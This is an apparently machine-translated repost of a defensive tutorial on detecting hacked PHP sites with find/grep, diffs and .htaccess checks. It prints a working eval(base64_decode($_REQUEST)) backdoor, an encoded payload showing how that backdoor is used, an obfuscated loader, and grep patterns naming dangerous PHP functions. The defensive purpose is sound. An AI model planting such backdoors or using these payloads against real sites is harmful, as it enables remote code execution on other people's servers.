<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How to know that your PHP site has been hacked</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="My friend's site was recently hacked, it was running an old version of IP.Board, in which there is a local code inclusion vulnerability. This post wil...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How to know that your PHP site has been hacked</h1><div class="post__text post__text-html js-mediator-article">  My friend's site was recently hacked, it was running an old version of IP.Board, in which there is a local code inclusion vulnerability.  This post will not be devoted to IP.Board or another php code, it will show how to find potentially malicious php code on your servers.  Finally, I'll show you an example of what attackers can upload to a hacked site. <br><br><h4>  Check access logs </h4><br>  In order to start somewhere, I would like to share some entries from the access log of my friend‚Äôs hacked site. <br><br><pre><code class="bash hljs">IpreMOVED - - [01/Mar/2013:06:16:48 -0600] <span class="hljs-string"><span class="hljs-string">"POST /uploads/monthly_10_2012/view.php HTTP/1.1"</span></span> 200 36 <span class="hljs-string"><span class="hljs-string">"-"</span></span> <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0"</span></span> IpreMOVED - - [01/Mar/2013:06:12:58 -0600] <span class="hljs-string"><span class="hljs-string">"POST /public/style_images/master/profile/blog.php HTTP/1.1"</span></span> 200 36 <span class="hljs-string"><span class="hljs-string">"-"</span></span> <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0"</span></span></code> </pre> <br>  It is often necessary to check access logs on the server, but if you are not careful, URLs such as the ones above, which at first glance look harmless, can pass right by you. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The two files above are the scripts uploaded by the hacker, they do not play a big role as the code on any two servers is likely to be different.  However, in this particular example, the vulnerability in the legacy version of IP.Board was used, and the attackers were able to add their own scripts to the writable directories, such as a custom download directory and a directory in which IP.Board stores cached skin images. .  This is a common attack vector, many people change the rights to these directories to 777 or give them write access, more on this later. <br><br>  Let's take a closer look at the above log lines, does not it catch you? <br><br>  Note that in the access log POST requests, not GET requests. <br>  Most likely, the attackers wanted to make the access log more inconspicuous, since most of the logs do not store post data. <a name="habracut"></a><br><br><h4>  Detection of malicious PHP files </h4><br>  There are several ways to identify suspicious php files on your server, here are the best. <br>  <strong>Tip:</strong> follow these commands from the root directory of your site. <br><br><h5>  Search for recently modified PHP files </h5><br>  Let's start with a simple one, let's say you haven't made any changes in php code for a while, the following command searches for all php files in the current directory tree that have changed in the last week.  You can change the mtime option at will, for example mtime -14 for two weeks. <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> -mtime -7</code> </pre> <br>  My hacked server returned these results: <br><br><pre> <code class="bash hljs">./uploads/monthly_04_2008/index.php ./uploads/monthly_10_2008/index.php ./uploads/monthly_08_2009/template.php ./uploads/monthly_02_2013/index.php</code> </pre> <br>  All these scripts are uploaded by the attacker to the user's download directory. <br>  <strong>Note:</strong> this command will produce false results if you yourself modified php files in a given period of time.  The following methods are much more effective. <br><br><h5>  Search all PHP files with suspicious code </h5><br>  This is not the best approach, the following commands look for php files containing attacking scripts.  We start simple and get more with advanced search. <br><br>  The first file check that contains eval, base64_decode, gzinflate or str_rot13. <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep -l <span class="hljs-string"><span class="hljs-string">"eval *("</span></span> --color find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep -l <span class="hljs-string"><span class="hljs-string">"base64_decode *("</span></span> --color find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep -l <span class="hljs-string"><span class="hljs-string">"gzinflate *("</span></span> --color</code> </pre> <br>  <strong>Hint: The</strong> first search parameter is the search directory, a dot means the current directory (and all subdirectories).  You can change this parameter to any existing directory name to reduce search results, for example: <br><br><pre> <code class="bash hljs">find wp-admin -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep -l <span class="hljs-string"><span class="hljs-string">"gzinflate *("</span></span> --color</code> </pre><br>  If you remove the -l option from grep, it will show the text of the matched file.  To go further, I would use this joint team, which is more common <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep -l <span class="hljs-string"><span class="hljs-string">"eval *(str_rot13 *(base64_decode *("</span></span> --color</code> </pre> <br>  This command will find php files containing <strong>eval (str_rot13 (base64_decode (</strong> <br>  The grep syntax is very simple and you can change it to fit your needs.  Take a look at the expression above that we are looking for, this is <strong>‚Äúeval * (str_rot13 * (base64_decode * (‚Äù</strong> <br>  Space followed by * means zero or more space characters.  The above expression will be valid for the following lines: <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(str_rot13(base64_decode <span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>( str_rot13( base64_decode <span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>( str_rot13( base64_decode</code> </pre><br>  <strong>Tip:</strong> expand the expression to find functions that can be used maliciously, such as mail, fsockopen, pfsockopen, stream_socket_client, exec, system and passthru.  You can combine all these values ‚Äã‚Äãinto one command: <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs egrep -i <span class="hljs-string"><span class="hljs-string">"(mail|fsockopen|pfsockopen|stream_socket_client|exec|system|passthru|eval|base64_decode) *\("</span></span></code> </pre><br>  <strong>Note:</strong> we use egrep, not grep, this allows us to use extended regular expressions. <br>  Finally, here‚Äôs an equally well-known way to hide the code: <br><br><pre> <code class="php hljs">preg_replace(<span class="hljs-string"><span class="hljs-string">"/.*/e"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'5b19fxq30jD8d/wp5C3tQoMx4CQ FILE GOES ON FOR A LONG TIME...... lnSELWEZJakW9R3f7+J+uYuFiiC318gZ9P8C'\x29\x29\x29\x3B"</span></span>,<span class="hljs-string"><span class="hljs-string">"."</span></span>);</code> </pre> <br>  preg_replace with the e modifier will execute this code, it looks unusual, however it is simply compressed in base64 php format using some hexadecimal character codes. <br>  \ x65 \ x76 \ x61 \ x6C \ x28 \ x67 \ x7A \ x69 \ x6E \ x66 \ x6C \ x61 \ x74 \ x65 \ x28 \ x62 \ x61 \ x73 \ x65 \ x36 \ x34 \ x5F \ x64 \ x65 \ x63 \ x6F \ x64 \ x65 \ x28 is translated as <b>eval (gzinflate (base64_decode (</b> , a \ x29 \ x29 \ x29 \ x3B, as <b>)));</b> <br><br>  This command will help you find the use of preg_replace: <br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs egrep -i <span class="hljs-string"><span class="hljs-string">"preg_replace *\((['|\"])(.).*\2[az]*e[^\1]*\1 *,"</span></span> --color</code> </pre><br>  <strong>Tip:</strong> if you get a ton of results from this command, you can save the result to a file or redirect it to another program called <em>less</em> , which allows you to view the results one page at a time.  The f key is responsible for scrolling forward, the q key for quitting. <br><br><pre> <code class="php hljs">find . -type f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep base64_ | less find . -type f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep base64_ &gt; results.txt</code> </pre> <br>  With any of the above search commands you can do the same. <br><br>  <strong>Tip:</strong> Notice the hex x29 at the end?  This is a closing bracket, and x3B is a semicolon.  You can verify this by running: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> chr(hexdec(<span class="hljs-string"><span class="hljs-string">'x29'</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> chr(hexdec(<span class="hljs-string"><span class="hljs-string">'x3B'</span></span>)); <span class="hljs-comment"><span class="hljs-comment">// outputs );</span></span></code> </pre> <br>  You can use find to search for these hex codes in php files for further verification. <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span> | xargs grep -il x29</code> </pre> <br>  This is a good approach if you know that you are not using hexadecimal values ‚Äã‚Äãin your code. <br><br><h5>  We state the facts </h5><br>  Most methods assume that the attacker uploads files to the north and uses some form of code obfuscation, when other attackers can simply change the existing php code.  In this case, the code may look natural and match the style of the existing script, or it may be confusing. <br><br>  In order to solve this problem, you need a clean copy of your code if you use common php scripts, such as wordpress, vbulletin, IP.Board, etc.  - all is ready.  If not, I hope you are using git or other version control systems and you can get a clean version of your code. <br><br>  For this example, I will use wordpress. <br><br>  I have two folders wordpress-clean, which contains just downloaded a copy of wordpress and wordpress-compromised, which contains a threat somewhere in the files. <br><br><pre> <code class="bash hljs">drwxr-xr-x 4 greg greg 4096 Mar 2 15:59 . drwxr-xr-x 4 greg greg 4096 Mar 2 15:59 .. drwxr-xr-x 5 greg greg 4096 Jan 24 15:53 wordpress-clean drwxr-xr-x 5 greg greg 4096 Jan 24 15:53 wordpress-compromised</code> </pre> <br>  I can find the differences between my installed wordpress and pure wordpress by running the command: <br><br><pre> <code class="bash hljs">diff -r wordpress-clean/ wordpress-compromised/ -x wp-content</code> </pre> <br>  I excluded wp-content from this search, because everyone has their own themes and plugins. <br>  <strong>Tip:</strong> make sure you use the same version of wordpress for comparison. <br><br>  Here are the results of my search: <br><br><pre> <code class="php hljs">diff -r -x wp-content wordpress-clean/wp-admin/includes/<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">wp</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">importer</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">php</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">wordpress</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">compromised</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">wp</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">admin</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">includes</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">wp</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">importer</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">php</span></span></span><span class="hljs-class"> 302</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">a303</span></span></span><span class="hljs-class">,306 &gt; &gt; </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">if</span></span></span><span class="hljs-class"> (</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">isset</span></span></span><span class="hljs-class">($</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">_REQUEST</span></span></span><span class="hljs-class">['</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">x</span></span></span><span class="hljs-class">'])) </span></span>{ &gt; <span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(base64_decode($_REQUEST[<span class="hljs-string"><span class="hljs-string">'x'</span></span>])); &gt; }</code> </pre> <br>  He found the malicious code! <br><br><h5>  Out of curiosity... </h5><br>  What can an attacker do with these 3 lines of code?  First, the attacker would learn useful information: <br><br><pre> <code class="php hljs">$payload = <span class="hljs-string"><span class="hljs-string">"file_put_contents(\"../../wp-content/uploads/wp-upload.php\", \"&lt;?php\nphpinfo();\");"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> base64_encode($payload); <span class="hljs-comment"><span class="hljs-comment">// output: ZmlsZV9wdXRfY29udGVudHMoIi4uLy4uL3dwLWNvbnRlbnQvdXBsb2Fkcy93cC11cGxvYWQucGhwIiwgIjw/cGhwCnBocGluZm8oKTsiKTs=</span></span></code> </pre><br>  Then he would send a GET or POST request to http: / /YOURSITE/wp-admin/includes/class-wp-importer.php with the x parameter containing the script created above.  As a result of its execution, the file /wp-content/uploads/wp-upload.php will be created, which displays information about your server.  This does not seem to be bad, but the fact is that an attacker can run any php code that he wants. <br>  <strong>Note:</strong> this only works if the wp-content / uploads directory is writable.  Almost always, depending on the settings of the web server, you can change the read / write rights to other files. <br><br><h5>  Always look for directories available for downloading executable code. </h5><br>  Using the methods presented above, it is easy to find php code in your boot directory.  For wordpress, this would be: <br><br><pre> <code class="bash hljs">find wp-content/uploads -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'*.php'</span></span></code> </pre> <br>  <strong>Tip:</strong> here is a very simple bash script that looks for directories to write and php files to them.  The result will be saved in the file results.txt.  The script works recursively. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash search_dir=$(pwd) writable_dirs=$(find $search_dir -type d -perm 0777) for dir in $writable_dirs do #echo $dir find $dir -type f -name '*.php' done</span></span></code> </pre> <br>  Name the file search_for_php_in_writable and give it execution rights <br><br><pre> <code class="bash hljs">chmod +x search_for_php_in_writable</code> </pre> <br>  Save this file in your home directory, then go to the directory where you are going to search and execute the following command: <br><br><pre> <code class="php hljs">~/search_for_php_in_writable &gt; results.txt ~/search_for_php_in_writable | less</code> </pre> <br>  <strong>Note:</strong> If your site is hosted on a shared hosting and the web server is not securely configured, your site may not be the only one subject to attack.  A general php shell download on vulnerable sites is essentially a tool that gives an attacker a file browser.  They can use this tool to download attacking scripts in all the folders on the server available for writing, for example, the download directory. <br>  <strong>Note:</strong> hackers usually try to upload images that contain php code, so check other extensions using the methods listed above. <br><br><pre> <code class="bash hljs">find wp-content/uploads -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f | xargs grep -i php find wp-content/uploads -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -iname <span class="hljs-string"><span class="hljs-string">'*.jpg'</span></span> | xargs grep -i php</code> </pre> <br>  Do not believe?  <a href="http://gregfreeman.org/files/source/badimage.orig.txt">This file</a> was uploaded as a jpg image on a hacked site.  It looks like he was mistaken for binary data.  <a href="http://gregfreeman.org/files/source/badimage.txt">Here is the same file</a> in a more ‚Äúreadable‚Äù format. <br><br>  Still can not read?  Just like me to a deeper check.  All this code is designed to run this function: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!defined(<span class="hljs-string"><span class="hljs-string">'FROM_IPB'</span></span>) &amp;&amp; !function_exists(<span class="hljs-string"><span class="hljs-string">"shutdownCallback"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> @$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_A"</span></span>]==<span class="hljs-string"><span class="hljs-string">"b"</span></span>) { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">shutdownCallback</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;!--"</span></span>.md5(<span class="hljs-string"><span class="hljs-string">"links"</span></span>).<span class="hljs-string"><span class="hljs-string">"--&gt;"</span></span>; } register_shutdown_function(<span class="hljs-string"><span class="hljs-string">"shutdownCallback"</span></span>); }</code> </pre> <br>  What makes this script irrelevant, you need to learn, you need to check your boot directories. <br>  If you're interested, this is just a test case to see if the node is vulnerable, the attack happened later. <br><br><h5>  Where else could a malicious code be hiding? </h5><br>  If your php code dynamically generates page content and your site has been hacked, a hacker can write malicious code to the database.  You can also conduct a more thorough check. <br><br>  Go to your website, after loading the page, look at its HTML source code and save it somewhere on your computer, for example mywebsite.txt;  Run the following command <br><br><pre> <code class="php hljs">grep -i <span class="hljs-string"><span class="hljs-string">'&lt;iframe'</span></span> mywebsite.txt</code> </pre><br>  Hackers often insert an iframe on hacked sites, check all the pages of the site! <br>  <strong>Tip:</strong> use the <a href="http://getfirebug.com/">firebug</a> extension for firefox to view the html content of your resource, the attacker can use javascipt to create an iframe, they will not be displayed when viewing the source code of the page in the browser, because the DOM changes after the page loads.  There is also a <a href="http-headers/">Live HTTP Headers</a> extension for firefox, which will show all current requests on your page.  This makes it easy to see web requests that should not be. <br><br><h4>  Database Search </h4><br>  The attacker may have added code to the database.  This will only be the case if your script stores custom code, such as plugins, in the database.  So does vBulletin.  Although this is rare, you should know this.  If you were hacked in this case, then the attacker is likely to insert an iframe into the tables that display the data on your site. <br><br>  In this example, we will use mysql or its derivatives. <br><br>  For this, I would like to use PHPMyAdmin and this is not usual for me, I prefer to use command line tools, the code they are available, but this tool is easy to find. <br><br>  Personally, I do not run PHPMyAdmin on a production server, I download a copy of the database and run it on a local server.  If the database is large, it is not recommended to search for small pieces of text on the production server. <br><br>  Open PHPMyAdmin, select the database and click 'Search'.  You can search for strings such as% base64_% and% eval (%, and any other combinations that I have already stated. <br><br><h4>  Check .htaccess files if you are using Apache </h4><br>  If you are using an Apache web server, check the .htaccess files for suspicious changes. <br><br>  auto_append_file and auto_prepend_file include other php files at the beginning or at the end of all php scripts, attackers can use them to include their code. <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'\.htaccess'</span></span> | xargs grep -i auto_prepend_file; find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'\.htaccess'</span></span> | xargs grep -i auto_append_file;</code> </pre> <br>  The following command looks for .htaccess files in all subdirectories that contain 'http'.  The result of the search will be a list of all redirection rules that may contain malicious rules. <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">'\.htaccess'</span></span> | xargs grep -i http;</code> </pre> <br>  Some malicious redirects are based on the user agent.  It would not be bad to look for using HTTP_USER_AGENT in .htaccess files.  Previous commands can be easily changed, just change the keyword before the semicolon. <br><br>  To increase security, if you can, disable the use of .htaccess in directories and move your configuration to the main apache configuration. <br><br><h4>  In the "real world" </h4><br>  So why do people want to hack your site, what does this mean for them?  For some, this is a hobby, but for others it is a source of income. <br><br>  Here is <a href="http://gregfreeman.org/files/source/attackfile.txt">an example of an attacking script</a> loaded on a hacked site.  It is based solely on post operations, most web server logs would be useless in this case.  I was able to get the post request logs: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">Array</span></span> ( [lsRiY] =&gt; YGFsZWN2bXBCY21uLGFtbw== [eIHSE] =&gt; PNxsDhxNdV [mFgSo] =&gt; b2NrbmtsLzIwLG96LGNtbixhbW8= [dsByW] =&gt; PldRR1A8Y3BhamtnXWprYWlxPi1XUUdQPAg+TENPRzwgQ3BhamtnIkprYWlxID4tTENPRzwIPlFX QEg8RFU4IlRoImNlcGMiMywiMjIiQWgiY25rcSIwLCIyMj4tUVdASDwiCD5RQE1GWzwIPkA8CD5m a3Q8PmMianBnZD8ganZ2cjgtLWhndnh4aW5rYWlnbCxhbW8tdXIva2xhbndmZ3EtUWtvcm5nUmtn LUZnYW1mZy1KVk9OLW5rYCxyanIgPFRoImNlcGMiMywiMjIiQWgiY25rcSIwLCIyMj4tYzw+LWZr dDwIPi1APAg+cjxqY3JyZ2wuImNsZiJ1amdsInZqZyJgbXsicGdjYWpnZiJjZWNrbCJrbHZtInZq ZyJ2bXsiYG16IksiZG13bGYib3txZ25kIkxndGdwImpnY3BmIm1kImt2LHZqZyIicmptdm1lcGNy anEibWQidmpnImNwdmtkY2F2InZqY3YidWcidWdwZyJubW1pa2xlImRtcCIiY2xmIiJyY3FxZ2Yi UnducWciImVtbWYuImpnInFja2YuImlsZ2dua2xlImBncWtmZyJtd3AiZHBrZ2xmLCJKZyJqY3Ei InZjaWdsIiI+LXI8CD4tUUBNRls8CA== [GGhp] =&gt; a3ZAbFFTSlJSbFo= [AIQXa] =&gt; e3VWT2VvQ0hyS0ha )</code> </pre> <br>  The malicious script is basically a SPAM zombie that will send any email to anyone who uses your server to send emails via a post request.  The keys in each post request can be changed and the script is very resourceful, it checks the installed functions and adapts to this.  For example, if php mail () is not available, it will try to create a socket on port 25 and send email directly via SMTP. <br><br>  If you are interested in deciphering the data of intruders, use the function called n9a2d8ce3.  Mysterious POST data puts down the destination address and the content of the e-mail. <br><br>  If you use the tips given in this article, it will not be difficult for you to find such a script. <br><br><h4>  Conclusion </h4><br>  If you use public php scripts like wordpress, pay attention to critical or security updates not only for the basic installation, but also for extensions such as plugins.  Most attackers will try to find thousands of sites with known vulnerabilities, so if you are vulnerable, you will be found in the end. <br><br>  If you are working on a workbench, you still need to constantly check the code, because there should not be vulnerabilities in the libraries that you use. </div><p>Source: <a href="https://habr.com/ru/post/188878/">https://habr.com/ru/post/188878/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../188866/index.html">Petitions demanding to ban the game "Company of Heroes-2" in the CIS, scored about 15 thousand signatures</a></li>
<li><a href="../188868/index.html">DFA: flying transformer robot</a></li>
<li><a href="../188870/index.html">The implementation of the anti-piracy law will require about 100 million rubles from the state budget</a></li>
<li><a href="../188872/index.html">Visual representation of SVN commit activity in the terminal</a></li>
<li><a href="../188876/index.html">Fix wheel on Logitech mouse</a></li>
<li><a href="../188884/index.html">Maha MH-C9000 - Analyzer, Charger and Restorer for Ni-MH / Ni-Cd Batteries</a></li>
<li><a href="../188886/index.html">Distribution of the Internet from a 3G modem to a local network in Linux</a></li>
<li><a href="../188888/index.html">x + = x ++</a></li>
<li><a href="../188894/index.html">Mail.ru certificate again</a></li>
<li><a href="../188896/index.html">Simplify your life with a service that combines services</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>